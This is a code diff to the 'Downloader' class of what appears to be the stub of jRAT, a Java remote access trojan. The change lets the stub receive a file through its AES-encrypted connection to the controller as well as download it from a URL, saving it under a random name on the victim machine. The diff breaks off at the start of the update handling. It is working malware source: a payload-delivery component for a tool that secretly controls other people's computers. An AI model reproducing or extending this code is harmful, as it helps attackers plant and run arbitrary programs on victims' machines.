@@ -9,6 +9,7 @@ import java.util.Random;
 
 import su.jrat.common.OperatingSystem;
 import su.jrat.common.downloadable.Downloadable;
+import su.jrat.common.io.FileIO;
 import su.jrat.stub.packets.incoming.Packet36Uninstall;
 
 
@@ -17,18 +18,18 @@ public class Downloader extends Thread {
 	private String url;
 	private boolean update;
 	private Downloadable type;
+	private boolean readFromSocket;
 
-	public Downloader(String url, boolean update, String type) {
+	public Downloader(String url, boolean update, String type, boolean readFromSocket) {
 		this.url = url;
 		this.update = update;
 		this.type = Downloadable.get(type);
+		this.readFromSocket = readFromSocket;
 	}
 
 	public void run() {
 		try {
 			Connection.status(Constants.STATUS_DOWNLOADING_FILE);
-
-			URLConnection con = new URL(url).openConnection();
 
 			String fileName = (new Random().nextInt()) + type.getExtension();
 
@@ -45,18 +46,26 @@ public class Downloader extends Thread {
 				if (!file.getParentFile().exists()) {
 					file.getParentFile().mkdirs();
 				}
+				
+				
+				if (readFromSocket) {
+					new FileIO().readFile(file, Connection.socket, Connection.dis, Connection.dos, null, Main.aesKey);					
+				} else {
+					URLConnection con = new URL(url).openConnection();
+					InputStream in = con.getInputStream();
+					
+					FileOutputStream fout = new FileOutputStream(file);
 
-				InputStream in = con.getInputStream();
-				FileOutputStream fout = new FileOutputStream(file);
+					byte data[] = new byte[1024];
+					int count;
+					while ((count = in.read(data, 0, 1024)) != -1) {
+						fout.write(data, 0, count);
+					}
 
-				byte data[] = new byte[1024];
-				int count;
-				while ((count = in.read(data, 0, 1024)) != -1) {
-					fout.write(data, 0, count);
+					in.close();
+					fout.close();
 				}
-
-				in.close();
-				fout.close();
+				
 
 				if (update) {
 					try {
